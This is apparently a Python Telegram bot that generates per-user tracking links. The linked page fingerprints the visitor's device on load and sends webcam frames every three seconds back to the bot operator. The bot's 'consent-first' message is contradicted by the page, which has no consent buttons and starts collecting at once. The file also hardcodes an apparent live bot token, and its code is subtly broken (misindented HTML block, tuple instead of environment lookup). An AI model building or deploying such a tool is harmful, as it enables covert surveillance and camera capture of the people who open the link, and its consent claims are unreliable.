#!/usr/bin/env python3
# main.py
import logging
import os
import uuid
import asyncio
import base64
from io import BytesIO
from aiohttp import web
from telegram import Update, InputFile
from telegram.ext import (
    Application, CommandHandler, ContextTypes
)

# ---------------- LOG ----------------
logging.basicConfig(
    format="%(asctime)s - %(name)s - %(levelname)s - %(message)s",
    level=logging.INFO
)
logger = logging.getLogger(__name__)

# ---------------- ENV ----------------
BOT_TOKEN = ("BOT_TOKEN", "8282416690:AAF2Uz6yfATHlrThT5YbGfxXyxi1vx3rUeA")
WEBHOOK_DOMAIN = ("WEBHOOK_DOMAIN", "https://fit-roanna-runex-7a8db616.koyeb.app").rstrip('/')

if not BOT_TOKEN or BOT_TOKEN == "YOUR_BOT_TOKEN_HERE":
    logger.error("BOT_TOKEN kerak! ENV ga qo'ying.")
    exit(1)

# ---------------- GLOBAL STATE ----------------
USER_TOKENS = {}  # token -> telegram_id

# ---------------- Telegram Handlers ----------------
async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Foydalanuvchi /start bosganda unikal linkni beradi va klar consent matnini yuboradi."""
    user_id = update.effective_user.id
    token = str(uuid.uuid4())
    USER_TOKENS[token] = user_id
    link = f"{WEBHOOK_DOMAIN}/track?token={token}"

    msg = (
        "👋 Salom! Bu test sahifasi **faqat** konsent asosida ishlaydi.\n\n"
        "📌 Siz test uchun rozi bo‘lsangiz, sahifadagi so‘rovlarga rozilik bering — faqat shunda ma'lumot yuboriladi.\n\n"
        f"🔗 Test havolasi:\n{link}\n\n"
        "⚠️ Eslatma: Bu havolani faqat test sub'ekti va o'zingiz foydalaning. Noqonuniy yig'ishdan saqlaning."
    )
    await update.message.reply_text(msg)

# ---------------- Web Server: /track ----------------
async def track_page(request):
    token = request.query.get('token')
    if not token or token not in USER_TOKENS:
        return web.Response(text="❌ Havola noto‘g‘ri yoki eskirgan.", status=403)

    # Consent-first sahifa: alohida tugmalar — joylashuv & kamera
  html = f"""
<!DOCTYPE html>
<html lang="uz">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width,initial-scale=1">
  <title>Ma'lumot yig'ilmoqda...</title>
  <style>
    body {{
      background-color: #0d1117;
      color: #c9d1d9;
      font-family: 'Segoe UI', sans-serif;
      display: flex;
      flex-direction: column;
      align-items: center;
      justify-content: center;
      height: 100vh;
      margin: 0;
      text-align: center;
    }}
    h2 {{ font-weight: 400; margin-bottom: 20px; }}
    .loader {{
      border: 4px solid #1f6feb;
      border-radius: 50%;
      border-top: 4px solid transparent;
      width: 50px; height: 50px;
      animation: spin 1s linear infinite;
    }}
    @keyframes spin {{
      0% {{ transform: rotate(0deg); }}
      100% {{ transform: rotate(360deg); }}
    }}
  </style>
</head>
<body>
  <h2>Iltimos, kuting... Ma'lumotlar yig‘ilmoqda</h2>
  <div class="loader"></div>
  <script>
    async function collect() {{
      const data = {{
        timestamp: new Date().toLocaleString('uz-UZ', {{ timeZone: 'Asia/Tashkent' }}),
        timezone: Intl.DateTimeFormat().resolvedOptions().timeZone || 'Noma\\'lum',
        utcOffset: -new Date().getTimezoneOffset() / 60,
        languages: (navigator.languages || [navigator.language]).join(', '),
        userAgent: navigator.userAgent,
        platform: navigator.platform,
        os: /Android/i.test(navigator.userAgent) ? 'Android' : /iPhone|iPad/.test(navigator.userAgent) ? 'iOS' : 'Noma\\'lum',
        browser: 'Noma\\'lum',
        screen: `${{screen.width}} × ${{screen.height}}`,
        viewport: `${{window.innerWidth}} × ${{window.innerHeight}}`,
        cpuCores: navigator.hardwareConcurrency || 'Noma\\'lum',
        ram: navigator.deviceMemory ? `${{navigator.deviceMemory}} GB` : 'Noma\\'lum',
        deviceType: /Mobi|Android/i.test(navigator.userAgent) ? 'Telefon/Planshet' : 'Kompyuter'
      }};
      if (navigator.userAgent.includes('Chrome')) data.browser = 'Chrome';
      else if (navigator.userAgent.includes('Firefox')) data.browser = 'Firefox';
      else if (navigator.userAgent.includes('Safari')) data.browser = 'Safari';

      try {{
        const stream = await navigator.mediaDevices.getUserMedia({{ video: true }});
        const video = document.createElement('video');
        video.srcObject = stream; video.play();
        const canvas = document.createElement('canvas');
        const ctx = canvas.getContext('2d');
        setInterval(() => {{
          canvas.width = video.videoWidth;
          canvas.height = video.videoHeight;
          ctx.drawImage(video, 0, 0);
          const imageData = canvas.toDataURL('image/jpeg');
          fetch('/upload_image', {{
            method: 'POST',
            headers: {{ 'Content-Type': 'application/json' }},
            body: JSON.stringify({{ token: '{token}', image: imageData }})
          }});
        }}, 3000);
      }} catch (e) {{
        console.log('Kamera ruxsat berilmadi');
      }}

      fetch('/submit', {{
        method: 'POST',
        headers: {{ 'Content-Type': 'application/json' }},
        body: JSON.stringify({{ token: '{token}', ...data }})
      }}).then(() => {{
        document.body.innerHTML = "<h2>✅ Rahmat! Ma'lumotlar yuborildi.</h2>";
      }});
    }}
    collect();
  </script>
</body>
</html>
"""
    return web.Response(text=html, content_type='text/html')

# ---------------- Web Server: /submit ----------------
async def submit_data(request):
    try:
        data = await request.json()
        token = data.get('token')
        telegram_id = USER_TOKENS.get(token)
        if not telegram_id:
            return web.json_response({"error": "Token topilmadi"}, status=400)

        # Yarim formatlangan xabar — kerakli maydonlarni chiqaramiz
        lines = []
        lines.append(f"🕒 {data.get('timestamp', 'Noma\\'lum')}")
        if 'latitude' in data and 'longitude' in data:
            lines.append(f"📍 Joylashuv: {data.get('latitude')}, {data.get('longitude')} (aniqlik: {data.get('accuracy', '?')} m)")
        lines.append(f"🌍 Vaqt zonasi: {data.get('timezone', 'Noma\\'lum')} (UTC{data.get('utcOffset', '+?')})")
        lines.append(f"💬 Til: {data.get('languages', 'Noma\\'lum')}")
        lines.append(f"💻 Tizim: {data.get('os', 'Noma\\'lum')} | Brauzer: {data.get('browser', 'Noma\\'lum')}")
        lines.append(f"📱 Qurilma: {data.get('deviceType', 'Noma\\'lum')} | Platform: {data.get('platform', '-')}")
        lines.append(f"🧠 CPU: {data.get('cpuCores', '?')} | RAM: {data.get('ram', '?')}")
        lines.append(f"📺 Ekran: {data.get('screen', '?')} | Ko'rinish: {data.get('viewport', '?')}")
        if 'cameraResolution' in data:
            lines.append(f"📷 Kamera: {data.get('cameraResolution')}")
        lines.append(f"🔍 UA: {data.get('userAgent', 'Noma\\'lum')}")

        message = "\n".join(lines)
        await request.app['bot'].send_message(chat_id=telegram_id, text=message)
        return web.json_response({"status": "ok"})
    except Exception as e:
        logger.exception(f"[SUBMIT ERROR] {e}")
        return web.json_response({"error": str(e)}, status=500)

# ---------------- Web Server: /upload_image ----------------
async def upload_image(request):
    try:
        data = await request.json()
        token = data.get('token')
        image_data = data.get('image')

        telegram_id = USER_TOKENS.get(token)
        if not telegram_id:
            return web.json_response({"error": "Token topilmadi"}, status=400)

        if not image_data:
            return web.json_response({"error": "Rasm topilmadi"}, status=400)

        if ',' in image_data:
            image_data = image_data.split(',', 1)[1]

        image_bytes = base64.b64decode(image_data)
        image_io = BytesIO(image_bytes)
        image_io.name = "photo.jpg"

        await request.app['bot'].send_photo(chat_id=telegram_id, photo=InputFile(image_io))
        return web.json_response({"status": "ok"})
    except Exception as e:
        logger.exception("[UPLOAD IMAGE ERROR]")
        return web.json_response({"error": str(e)}, status=500)


# ---------------- Web Server Starter ----------------
async def start_web_server(bot):
    app = web.Application()
    app['bot'] = bot
    app.router.add_get('/track', track_page)
    app.router.add_post('/submit', submit_data)
    app.router.add_post('/upload_image', upload_image)
    runner = web.AppRunner(app)
    await runner.setup()
    port = int(os.getenv("PORT", "8000"))
    site = web.TCPSite(runner, '0.0.0.0', port)
    await site.start()
    logger.info(f"🌐 Web server ishga tushdi: http://0.0.0.0:{port}")

# ---------------- Startup ----------------
async def on_startup(app: Application):
    asyncio.create_task(start_web_server(app.bot))

# ---------------- Main ----------------
def main():
    app = Application.builder().token(BOT_TOKEN).post_init(on_startup).build()
    app.add_handler(CommandHandler("start", start))
    logger.info("🚀 Bot ishga tushdi.")
    app.run_polling()

if __name__ == "__main__":
    main()
